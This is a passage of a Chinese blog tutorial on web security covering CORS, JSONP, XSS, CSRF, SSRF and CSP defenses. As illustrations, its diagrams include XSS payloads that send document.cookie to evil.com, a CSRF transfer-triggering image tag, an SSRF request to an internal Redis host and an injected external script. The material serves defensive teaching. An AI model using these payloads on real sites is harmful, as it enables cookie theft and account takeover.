<p><strong>安全注意</strong>：当 <code>Access-Control-Allow-Credentials: true</code> 时，<code>Access-Control-Allow-Origin</code> 不能设为 <code>*</code>，必须指定具体的源。</p>
<h5 id="携带-cookie-的跨域请求">携带 Cookie 的跨域请求</h5>
<pre><code class="hljs mermaid">sequenceDiagram
    participant B as 浏览器（a.com）
    participant S as 服务器（api.b.com）

    B-&gt;&gt;S: GET /api/user&lt;br/&gt;Origin: https://a.com&lt;br/&gt;Cookie: session_id=abc123
    Note over B: 前端需设置&lt;br/&gt;fetch(url, &#123;credentials: &#x27;include&#x27;&#125;)

    S--&gt;&gt;B: 200 OK&lt;br/&gt;Access-Control-Allow-Origin: https://a.com&lt;br/&gt;Access-Control-Allow-Credentials: true
    Note over S: 不能用 * 必须指定具体源</code></pre>
<h4 id="jsonp-历史方案">JSONP（历史方案）</h4>
<p>JSONP 利用 <code>&lt;script&gt;</code> 标签不受同源策略限制的特性实现跨域数据获取。原理是服务器返回一段 JavaScript 函数调用，将数据作为参数传入。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 前端定义回调函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleData</span>(<span class="hljs-params">data</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>&#125;<br><br><span class="hljs-comment">// 动态创建 script 标签</span><br><span class="hljs-keyword">const</span> script = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;script&#x27;</span>);<br>script.<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;https://api.b.com/data?callback=handleData&#x27;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(script);<br><br><span class="hljs-comment">// 服务器返回：handleData(&#123;&quot;name&quot;: &quot;John&quot;, &quot;age&quot;: 30&#125;)</span><br></code></pre></td></tr></table></figure>
<p><strong>局限性</strong>：仅支持 GET 请求，存在 XSS 风险（执行任意返回的 JavaScript），现代应用应使用 CORS 替代。</p>
<blockquote>
<p><strong>记忆锚点：CORS 是标准方案，JSONP 是历史遗留，生产环境用 CORS。</strong></p>
</blockquote>
<hr>
<h2 id="part-4：攻防与防护-如何兜底？">Part 4：攻防与防护——如何兜底？</h2>
<blockquote>
<p><strong>核心问题</strong>：会话管理、身份认证、同源策略构建了 Web 安全的基础设施，但攻击者总能找到突破口。常见的攻击手段有哪些？如何防御？</p>
</blockquote>
<h3 id="web-安全攻防">Web 安全攻防</h3>
<h4 id="三大攻击类型概览">三大攻击类型概览</h4>
<pre><code class="hljs mermaid">graph TD
    A[&quot;Web 安全攻击&quot;] --&gt; B[&quot;XSS&lt;br/&gt;跨站脚本攻击&quot;]
    A --&gt; C[&quot;CSRF&lt;br/&gt;跨站请求伪造&quot;]
    A --&gt; D[&quot;SSRF&lt;br/&gt;服务端请求伪造&quot;]

    B --&gt; B1[&quot;注入恶意脚本&lt;br/&gt;偷取用户数据&quot;]
    C --&gt; C1[&quot;借用用户身份&lt;br/&gt;执行未授权操作&quot;]
    D --&gt; D1[&quot;借用服务器网络&lt;br/&gt;访问内网资源&quot;]

    B1 --&gt; B2[&quot;防御：输入转义&lt;br/&gt;CSP + HttpOnly&quot;]
    C1 --&gt; C2[&quot;防御：CSRF Token&lt;br/&gt;SameSite Cookie&quot;]
    D1 --&gt; D2[&quot;防御：URL 白名单&lt;br/&gt;禁止内网访问&quot;]

    style B fill:#ffe6e6
    style C fill:#fff3e6
    style D fill:#e6e6ff</code></pre>
<table>
<thead>
<tr>
<th>攻击</th>
<th>本质</th>
<th>攻击目标</th>
<th>一句话总结</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>XSS</strong></td>
<td>在受害者浏览器中执行攻击者的脚本</td>
<td>用户数据（Cookie、表单）</td>
<td>偷内容</td>
</tr>
<tr>
<td><strong>CSRF</strong></td>
<td>借用受害者的已认证身份发起请求</td>
<td>用户操作（转账、改密码）</td>
<td>借身份</td>
</tr>
<tr>
<td><strong>SSRF</strong></td>
<td>借用服务器的网络位置访问内部资源</td>
<td>内网服务（数据库、管理后台）</td>
<td>借网络</td>
</tr>
</tbody>
</table>
<h4 id="xss-cross-site-scripting">XSS（Cross-Site Scripting）</h4>
<p>XSS 攻击的核心是：<strong>攻击者的脚本在受害者的浏览器上下文中执行</strong>，从而可以访问该页面的 Cookie、DOM、LocalStorage 等。</p>
<h5 id="三种-xss-类型">三种 XSS 类型</h5>
<table>
<thead>
<tr>
<th>类型</th>
<th>存储位置</th>
<th>触发方式</th>
<th>危害范围</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>存储型</strong></td>
<td>服务器数据库</td>
<td>用户访问包含恶意脚本的页面</td>
<td>所有访问该页面的用户</td>
</tr>
<tr>
<td><strong>反射型</strong></td>
<td>URL 参数</td>
<td>用户点击恶意链接</td>
<td>点击链接的用户</td>
</tr>
<tr>
<td><strong>DOM 型</strong></td>
<td>客户端 DOM</td>
<td>前端 JavaScript 处理不当</td>
<td>触发条件的用户</td>
</tr>
</tbody>
</table>
<h5 id="存储型-xss-攻击流程">存储型 XSS 攻击流程</h5>
<pre><code class="hljs mermaid">sequenceDiagram
    participant Attacker as 攻击者
    participant Server as 服务器
    participant Victim as 受害者

    Attacker-&gt;&gt;Server: 发表评论：&lt;br/&gt;&lt;script&gt;fetch(&#x27;https://evil.com/steal?cookie=&#x27;+document.cookie)&lt;/script&gt;
    Server-&gt;&gt;Server: 存入数据库（未转义）

    Victim-&gt;&gt;Server: 访问评论页面
    Server--&gt;&gt;Victim: 返回页面（包含恶意脚本）
    Victim-&gt;&gt;Victim: 浏览器执行恶意脚本
    Victim-&gt;&gt;Attacker: Cookie 被发送到 evil.com
    Attacker-&gt;&gt;Attacker: 获取受害者 Cookie&lt;br/&gt;冒充受害者身份</code></pre>
<h5 id="反射型-xss-攻击流程">反射型 XSS 攻击流程</h5>
<p>反射型 XSS 的恶意脚本不存储在服务器上，而是通过 URL 参数&quot;反射&quot;回页面：</p>
<pre><code class="hljs mermaid">sequenceDiagram
    participant Attacker as 攻击者
    participant Victim as 受害者
    participant Server as 服务器

    Attacker-&gt;&gt;Victim: 发送恶意链接&lt;br/&gt;https://search.com?q=&lt;script&gt;document.location=&#x27;https://evil.com/steal?c=&#x27;+document.cookie&lt;/script&gt;

    Victim-&gt;&gt;Server: 点击链接，访问 URL
    Server-&gt;&gt;Server: 将 q 参数值直接拼入 HTML&lt;br/&gt;（未转义）
    Server--&gt;&gt;Victim: 返回页面：&lt;br/&gt;&quot;搜索结果：&lt;script&gt;...&lt;/script&gt;&quot;
    Victim-&gt;&gt;Victim: 浏览器执行恶意脚本
    Victim-&gt;&gt;Attacker: Cookie 被发送到 evil.com</code></pre>
<p><strong>与存储型的区别</strong>：反射型 XSS 需要诱导用户点击特定链接，影响范围是单个用户；存储型 XSS 存入数据库后影响所有访问该页面的用户。</p>
<h5 id="dom-型-xss">DOM 型 XSS</h5>
<p>DOM 型 XSS 的特殊之处在于：<strong>恶意脚本不经过服务器</strong>，完全在客户端 JavaScript 中触发。</p>
<pre><code class="hljs mermaid">sequenceDiagram
    participant Attacker as 攻击者
    participant Victim as 受害者
    participant Browser as 浏览器（客户端）

    Attacker-&gt;&gt;Victim: 发送恶意链接&lt;br/&gt;https://app.com/page#&lt;img src=x onerror=alert(document.cookie)&gt;

    Victim-&gt;&gt;Browser: 点击链接
    Browser-&gt;&gt;Browser: 页面 JS 读取 location.hash&lt;br/&gt;document.getElementById(&#x27;content&#x27;).innerHTML = location.hash
    Browser-&gt;&gt;Browser: 浏览器解析注入的 HTML&lt;br/&gt;执行 onerror 中的脚本

    Note over Browser: 整个过程不经过服务器&lt;br/&gt;服务器日志中看不到攻击痕迹</code></pre>
<p><strong>典型的危险 API</strong>：</p>
<ul>
<li><code>document.innerHTML = userInput</code></li>
<li><code>document.write(userInput)</code></li>
<li><code>eval(userInput)</code></li>
<li><code>setTimeout(userInput, 0)</code></li>
</ul>
<p><strong>防御要点</strong>：使用 <code>textContent</code> 替代 <code>innerHTML</code>，使用 <code>encodeURIComponent</code> 处理 URL 参数。</p>
<h5 id="xss-防御措施">XSS 防御措施</h5>
<table>
<thead>
<tr>
<th>防御层</th>
<th>措施</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>输入层</strong></td>
<td>HTML 实体编码（<code>&lt;</code> → <code>&amp;lt;</code>）</td>
<td>防止脚本注入</td>
</tr>
<tr>
<td><strong>输出层</strong></td>
<td>根据上下文选择编码方式（HTML/JS/URL/CSS）</td>
<td>防止不同上下文的注入</td>
</tr>
<tr>
<td><strong>DOM 层</strong></td>
<td>使用 <code>textContent</code> 替代 <code>innerHTML</code></td>
<td>防止 DOM 型 XSS</td>
</tr>
<tr>
<td><strong>Cookie 层</strong></td>
<td>设置 <code>HttpOnly</code> 标志</td>
<td>禁止 JavaScript 读取 Cookie</td>
</tr>
<tr>
<td><strong>浏览器层</strong></td>
<td>配置 CSP（Content Security Policy）</td>
<td>限制脚本来源</td>
</tr>
</tbody>
</table>
<h4 id="csrf-cross-site-request-forgery">CSRF（Cross-Site Request Forgery）</h4>
<p>CSRF 攻击的核心是：<strong>浏览器在发送跨站请求时会自动携带目标站点的 Cookie</strong>。攻击者不需要知道 Cookie 的内容，只需要诱导用户的浏览器发起请求。</p>
<p><img src="csrf%E6%94%BB%E5%87%BB.jpeg" alt="CSRF 攻击"></p>
<h5 id="csrf-攻击流程">CSRF 攻击流程</h5>
<pre><code class="hljs mermaid">sequenceDiagram
    participant U as 受害者浏览器
    participant Bank as bank.com
    participant Evil as evil.com

    U-&gt;&gt;Bank: 登录 bank.com
    Bank--&gt;&gt;U: Set-Cookie: session=abc123

    U-&gt;&gt;Evil: 访问 evil.com（被诱导点击）
    Evil--&gt;&gt;U: 返回恶意页面&lt;br/&gt;&lt;img src=&quot;https://bank.com/transfer?to=attacker&amp;amount=10000&quot;&gt;

    Note over U: 浏览器自动携带 bank.com 的 Cookie
    U-&gt;&gt;Bank: GET /transfer?to=attacker&amp;amount=10000&lt;br/&gt;Cookie: session=abc123
    Bank-&gt;&gt;Bank: 验证 Session → 有效&lt;br/&gt;执行转账
    Bank--&gt;&gt;U: 转账成功</code></pre>
<h5 id="csrf-token-防御流程">CSRF Token 防御流程</h5>
<pre><code class="hljs mermaid">sequenceDiagram
    participant U as 用户浏览器
    participant S as 服务器
    participant E as evil.com

    Note over U,S: 正常请求流程
    U-&gt;&gt;S: GET /transfer-form
    S-&gt;&gt;S: 生成 CSRF Token&lt;br/&gt;存入 Session
    S--&gt;&gt;U: 返回表单&lt;br/&gt;&lt;input type=&quot;hidden&quot; name=&quot;_csrf&quot; value=&quot;token123&quot;&gt;

    U-&gt;&gt;S: POST /transfer&lt;br/&gt;Cookie: session=abc123&lt;br/&gt;Body: to=friend&amp;amount=100&amp;_csrf=token123
    S-&gt;&gt;S: 验证 CSRF Token&lt;br/&gt;Session 中的 Token == 请求中的 Token
    S--&gt;&gt;U: 转账成功

    Note over U,E: CSRF 攻击被拦截
    U-&gt;&gt;E: 访问 evil.com
    E--&gt;&gt;U: &lt;form action=&quot;bank.com/transfer&quot;&gt;&lt;br/&gt;（无法获取 CSRF Token）

    U-&gt;&gt;S: POST /transfer&lt;br/&gt;Cookie: session=abc123&lt;br/&gt;Body: to=attacker&amp;amount=10000&lt;br/&gt;（缺少 _csrf 参数）
    S-&gt;&gt;S: CSRF Token 验证失败
    S--&gt;&gt;U: 403 Forbidden</code></pre>
<h5 id="csrf-防御措施">CSRF 防御措施</h5>
<table>
<thead>
<tr>
<th>防御措施</th>
<th>原理</th>
<th>适用场景</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>CSRF Token</strong></td>
<td>服务端生成随机 Token，嵌入表单，提交时验证</td>
<td>传统表单提交</td>
</tr>
<tr>
<td><strong>SameSite Cookie</strong></td>
<td>限制 Cookie 在跨站请求中的发送</td>
<td>现代浏览器</td>
</tr>
<tr>
<td><strong>检查 Referer/Origin</strong></td>
<td>验证请求来源是否合法</td>
<td>辅助防御</td>
</tr>
<tr>
<td><strong>双重 Cookie</strong></td>
<td>将 Token 同时放在 Cookie 和请求参数中</td>
<td>API 场景</td>
</tr>
</tbody>
</table>
<h4 id="ssrf-server-side-request-forgery">SSRF（Server-Side Request Forgery）</h4>
<p>SSRF 攻击的核心是：<strong>攻击者通过服务器发起请求，访问服务器所在内网的资源</strong>。服务器成为攻击者的&quot;跳板&quot;。</p>
<h5 id="ssrf-攻击流程">SSRF 攻击流程</h5>
<pre><code class="hljs mermaid">sequenceDiagram
    participant A as 攻击者
    participant S as 目标服务器
    participant I as 内网服务&lt;br/&gt;（192.168.1.100）

    A-&gt;&gt;S: POST /fetch-url&lt;br/&gt;url=http://192.168.1.100:6379/
    Note over S: 服务器在内网中&lt;br/&gt;可以访问内网地址
    S-&gt;&gt;I: GET http://192.168.1.100:6379/
    I--&gt;&gt;S: Redis 响应数据
    S--&gt;&gt;A: 返回内网数据

    Note over A: 攻击者获取了&lt;br/&gt;本不可达的内网数据</code></pre>
<h5 id="ssrf-防御措施">SSRF 防御措施</h5>
<table>
<thead>
<tr>
<th>防御措施</th>
<th>原理</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>URL 白名单</strong></td>
<td>只允许访问预定义的域名/IP</td>
</tr>
<tr>
<td><strong>禁止内网地址</strong></td>
<td>过滤 <code>10.x.x.x</code>、<code>172.16-31.x.x</code>、<code>192.168.x.x</code>、<code>127.0.0.1</code></td>
</tr>
<tr>
<td><strong>禁止非常用协议</strong></td>
<td>只允许 HTTP/HTTPS，禁止 <code>file://</code>、<code>gopher://</code>、<code>dict://</code></td>
</tr>
<tr>
<td><strong>DNS 重绑定防护</strong></td>
<td>解析 URL 后验证 IP，防止 DNS 指向内网</td>
</tr>
</tbody>
</table>
<blockquote>
<p><strong>记忆锚点：XSS 偷内容靠注入脚本，CSRF 借身份靠自动携带 Cookie，SSRF 借网络靠服务器跳板。</strong></p>
</blockquote>
<h3 id="csp-内容安全策略">CSP 内容安全策略</h3>
<blockquote>
<p><strong>核心问题</strong>：即使做了输入转义和 HttpOnly，XSS 防御仍可能存在遗漏。能否从浏览器层面建立最后一道防线？</p>
</blockquote>
<p>CSP（Content Security Policy，W3C 规范）通过 HTTP 响应头告诉浏览器：<strong>只允许加载和执行来自指定来源的资源</strong>。即使攻击者成功注入了恶意脚本，浏览器也会拒绝执行。</p>
<h4 id="csp-工作原理">CSP 工作原理</h4>
<pre><code class="hljs mermaid">sequenceDiagram
    participant S as 服务器
    participant B as 浏览器
    participant CDN as cdn.example.com
    participant Evil as evil.com

    S--&gt;&gt;B: HTTP 响应&lt;br/&gt;Content-Security-Policy:&lt;br/&gt;script-src &#x27;self&#x27; https://cdn.example.com

    B-&gt;&gt;CDN: 加载 https://cdn.example.com/app.js
    CDN--&gt;&gt;B: 返回脚本
    B-&gt;&gt;B: 来源在白名单中 → 允许执行

    Note over B: 页面中存在注入的恶意脚本
    B-&gt;&gt;B: 发现 &lt;script src=&quot;https://evil.com/steal.js&quot;&gt;
    B-&gt;&gt;B: evil.com 不在白名单中 → 拒绝加载
    B-&gt;&gt;S: 发送 CSP 违规报告</code></pre>
<p><img src="github-csp.png" alt="GitHub CSP 配置"></p>
<h4 id="csp-指令速查">CSP 指令速查</h4>
<table>
<thead>
<tr>
<th>指令</th>
<th>控制的资源</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>default-src</code></td>
<td>所有资源的默认策略</td>
<td><code>default-src 'self'</code></td>
</tr>
<tr>
<td><code>script-src</code></td>
<td>JavaScript 脚本</td>
<td><code>script-src 'self' https://cdn.com</code></td>
</tr>
<tr>
<td><code>style-src</code></td>
<td>CSS 样式</td>
<td><code>style-src 'self' 'sha256-xxx'</code></td>
</tr>
<tr>
<td><code>img-src</code></td>
<td>图片</td>
<td><code>img-src * data:</code></td>
</tr>
<tr>
<td><code>connect-src</code></td>
<td>AJAX/WebSocket/Fetch</td>
<td><code>connect-src 'self' https://api.com</code></td>
</tr>
<tr>
<td><code>font-src</code></td>
<td>字体文件</td>
<td><code>font-src 'self'</code></td>
</tr>
<tr>
<td><code>frame-src</code></td>
<td>iframe 嵌入</td>
<td><code>frame-src 'none'</code></td>
</tr>
<tr>
<td><code>frame-ancestors</code></td>
<td>允许嵌入本页面的父页面</td>
<td><code>frame-ancestors 'self'</code></td>
</tr>
<tr>
<td><code>script-src-elem</code></td>
<td><code>&lt;script&gt;</code> 元素（CSP Level 3）</td>
<td><code>script-src-elem 'self'</code></td>
</tr>
</tbody>
</table>
<p><img src="csp-%E6%A0%BC%E5%BC%8F.png" alt="CSP 格式"></p>
<h4 id="csp-值类型">CSP 值类型</h4>
<table>
<thead>
<tr>
<th>值</th>
<th>含义</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>'none'</code></td>
<td>禁止加载任何资源</td>
<td><code>script-src 'none'</code></td>
</tr>
<tr>
<td><code>'self'</code></td>
<td>仅允许同源资源</td>
<td><code>script-src 'self'</code></td>
</tr>
<tr>
<td><code>*</code></td>
<td>允许任何来源</td>
<td><code>img-src *</code></td>
</tr>
<tr>
<td><code>https:</code></td>
<td>仅允许 HTTPS 资源</td>
<td><code>img-src https:</code></td>
</tr>
<tr>
<td><code>'nonce-{value}'</code></td>
<td>允许携带指定 nonce 的内联脚本</td>
<td><code>script-src 'nonce-abc123'</code></td>
</tr>
<tr>
<td><code>'sha256-{hash}'</code></td>
<td>允许哈希匹配的内联脚本</td>
<td><code>style-src 'sha256-xxx'</code></td>
</tr>
<tr>
<td><code>'unsafe-inline'</code></td>
<td>允许内联脚本/样式（危险）</td>
<td><code>script-src 'unsafe-inline'</code></td>
</tr>
<tr>
<td><code>'unsafe-eval'</code></td>
<td>允许 <code>eval()</code> 等危险函数</td>
<td><code>script-src 'unsafe-eval'</code></td>
</tr>
</tbody>
</table>
<blockquote>
<p><em><em>记忆锚点：none 禁止，self 同源，</em> 全开，unsafe 危险。</em>*</p>
</blockquote>
<h4 id="实战配置模板">实战配置模板</h4>
<p><strong>高安全站点（银行）</strong>：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Security-Policy</span><span class="hljs-punctuation">: </span>default-src &#x27;none&#x27;;<br>  script-src &#x27;self&#x27; &#x27;nonce-&#123;&#123;nonce&#125;&#125;&#x27;;<br>  style-src &#x27;self&#x27; &#x27;sha256-&#123;&#123;hash&#125;&#125;&#x27;;<br>  img-src &#x27;self&#x27; data: https:;<br>  font-src &#x27;self&#x27;;<br>  connect-src &#x27;self&#x27;;<br>  frame-ancestors &#x27;none&#x27;;<br>  base-uri &#x27;self&#x27;;<br>  form-action &#x27;self&#x27;;<br>  upgrade-insecure-requests;<br></code></pre></td></tr></table></figure>
<p><strong>通用业务站点</strong>：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Security-Policy</span><span class="hljs-punctuation">: </span>default-src &#x27;self&#x27;;<br>  script-src &#x27;self&#x27; https://cdn.jsdelivr.net;<br>  style-src &#x27;self&#x27; &#x27;sha256-AbCdEf==&#x27;;<br>  img-src * data:;<br>  frame-ancestors &#x27;self&#x27;;<br></code></pre></td></tr></table></figure>
<h4 id="违规报告与监控">违规报告与监控</h4>
<p>CSP 提供两种模式：<strong>强制模式</strong>和<strong>报告模式</strong>。</p>
<table>
<thead>
<tr>
<th>模式</th>
<th>响应头</th>
<th>行为</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>强制模式</strong></td>
<td><code>Content-Security-Policy</code></td>
<td>拦截违规资源 + 发送报告</td>
</tr>
<tr>
<td><strong>报告模式</strong></td>
<td><code>Content-Security-Policy-Report-Only</code></td>
<td>不拦截，仅发送报告</td>
</tr>
</tbody>
</table>
<p>报告模式适用于：</p>
<ul>
<li>新站点上线前收集违规情况</li>
<li>逐步收紧 CSP 策略，避免直接阻断业务</li>
<li>监控第三方资源的变化</li>
</ul>
<p>服务器接收的 JSON 报告示例：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;csp-report&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;document-uri&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://example.com/&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;blocked-uri&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://evil.com/x.js&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;violated-directive&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;script-src&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;original-policy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27; https://cdn.com&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
<blockquote>
<p><strong>记忆锚点：Report-Only 只报告不拦截，强制模式拦截并报告。</strong></p>
</blockquote>
<h4 id="实际攻击拦截示例">实际攻击拦截示例</h4>
<p>假设站点配置了以下 CSP 规则：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Security-Policy</span><span class="hljs-punctuation">: </span>script-src-elem &#x27;self&#x27; https://cdn.jsdelivr.net; report-uri /csp-report;<br></code></pre></td></tr></table></figure>
<p><strong>攻击场景</strong>：攻击者在评论框中注入恶意脚本</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://xss.hacker.tools/cookie.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p><strong>拦截结果</strong>：</p>
<ul>
<li>浏览器控制台报错：<code>Refused to load http://xss.hacker.tools/cookie.js because it does not appear in the script-src directive of the Content Security Policy.</code></li>
<li>恶意脚本被拦截，XSS 攻击失败</li>
<li>服务器收到违规报告，可追踪攻击来源</li>
</ul>
<p><strong>对比</strong>：如果没有 CSP，恶意脚本将被执行，攻击者可窃取用户 Cookie。</p>
<h4 id="漏洞占比与-csp-的重要性">漏洞占比与 CSP 的重要性</h4>
<p>根据 2019-2020 年度漏洞统计数据，XSS 仍是 Web 安全中最常见的漏洞类型之一：</p>
<p><img src="2019-2020%E5%B9%B4%E5%BA%A6%E6%BC%8F%E6%B4%9E%E5%8D%A0%E6%AF%94.png" alt="2019-2020年度漏洞占比"></p>
<p>CSP 作为浏览器层面的防护机制，可以有效阻断大部分 XSS 攻击，是 Web 安全防护体系的重要组成部分。</p>
<blockquote>
<p><strong>记忆锚点：XSS 占比高，CSP 兜底防。</strong></p>
</blockquote>
<h4 id="常见误区">常见误区</h4>
<ul>
<li><strong>[错误]</strong> CSP 能防 SQL 注入、SSRF → CSP 只在浏览器生效，与后端漏洞无关</li>
<li><strong>[错误]</strong> 加了 CSP 就不用转义 → CSP 是额外防线，仍需输入输出编码</li>
<li><strong>[错误]</strong> <code>unsafe-inline</code> 方便 → 等于关掉 XSS 防护，生产环境禁用</li>
</ul>
<h4 id="meta-标签与响应头对比"><code>&lt;meta&gt;</code> 标签与响应头对比</h4>
<table>
<thead>
<tr>
<th>维度</th>
<th>HTTP 响应头</th>
<th><code>&lt;meta&gt;</code> 标签</th>
</tr>
</thead>
<tbody>
<tr>
<td>功能完整性</td>
<td>完整</td>
<td>不支持 <code>report-to</code>、<code>frame-ancestors</code>、<code>sandbox</code></td>
</tr>
<tr>
<td>生效时机</td>
<td>最早（HTTP 层）</td>
<td>解析到 <code>&lt;meta&gt;</code> 时才生效</td>
</tr>
<tr>
<td>适用场景</td>
<td>生产环境（推荐）</td>
<td>静态托管、CDN 边缘节点的应急部署</td>
</tr>
<tr>
<td>覆盖范围</td>
<td>所有资源</td>
<td>仅当前 HTML 文档</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="模式速查表">模式速查表</h2>
<table>
<thead>
<tr>
<th>关键词</th>
<th>模式</th>
<th>方案</th>
<th>口诀</th>
</tr>
</thead>
<tbody>
<tr>
<td>HTTP 无状态</td>
<td>载体 + 服务端存储</td>
<td>Cookie + Session</td>
<td>Cookie 传 ID，Session 存数据</td>
</tr>
<tr>
<td>Cookie 安全</td>
<td>属性控制</td>
<td>六大属性 + SameSite</td>
<td>域路径定范围，三开关定安全</td>
</tr>
<tr>
<td>分布式 Session</td>
<td>集中存储</td>
<td>Redis 共享 Session</td>
<td>复制有风暴，粘性怕宕机，Redis 是首选</td>
</tr>
<tr>
<td>HTTP 认证</td>
<td>质询-响应</td>
<td>Basic → Digest → Bearer</td>
<td>明文 → 哈希 → 令牌</td>
</tr>
<tr>
<td>无状态令牌</td>
<td>自包含 + 签名</td>
<td>JWT</td>
<td>签名防篡改，过期防滥用，签出去收不回来</td>
</tr>
<tr>
<td>跨系统免登录</td>
<td>中心化认证</td>
<td>CAS SSO</td>
<td>没 Cookie 就跳转，有 TGC 就签 ST</td>
</tr>
<tr>
<td>第三方授权</td>
<td>授权码分离</td>
<td>OAuth 2.0</td>
<td>前端拿 Code，后端换 Token</td>
</tr>
<tr>
<td>浏览器隔离</td>
<td>同源策略</td>
<td>SOP + CORS</td>
<td>协议域名端口三元组</td>
</tr>
<tr>
<td>脚本注入</td>
<td>输入转义 + 浏览器兜底</td>
<td>编码 + CSP + HttpOnly</td>
<td>XSS 偷内容，转义是基础，CSP 是兜底</td>
</tr>
<tr>
<td>身份借用</td>
<td>Token 验证</td>
<td>CSRF Token + SameSite</td>
<td>CSRF 借身份，Token 来验证</td>
</tr>
<tr>
<td>网络穿透</td>
<td>白名单 + 地址过滤</td>
<td>URL 白名单 + 禁内网</td>
<td>SSRF 借网络，白名单来挡</td>
</tr>
<tr>
<td>资源加载控制</td>
<td>白名单策略</td>
<td>CSP</td>
<td>脚本管 XSS，frame 管劫持</td>
</tr>
</tbody>
</table>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://magicliang.github.io">magicliang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://magicliang.github.io/2025/07/03/Web-%E4%BC%9A%E8%AF%9D%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%85%A8%E6%99%AF/">https://magicliang.github.io/2025/07/03/Web-%E4%BC%9A%E8%AF%9D%E4%B8%8E%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%85%A8%E6%99%AF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/Session/">Session</a><a class="post-meta__tags" href="/tags/Cookie/">Cookie</a><a class="post-meta__tags" href="/tags/JWT/">JWT</a><a class="post-meta__tags" href="/tags/OAuth/">OAuth</a><a class="post-meta__tags" href="/tags/SSO/">SSO</a><a class="post-meta__tags" href="/tags/Security/">Security</a><a class="post-meta__tags" href="/tags/CORS/">CORS</a><a class="post-meta__tags" href="/tags/XSS/">XSS</a><a class="post-meta__tags" href="/tags/CSRF/">CSRF</a><a class="post-meta__tags" href="/tags/CSP/">CSP</a></div><div class="post-share"><div class="social-share" data-image="/img/wall-paper-2.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item 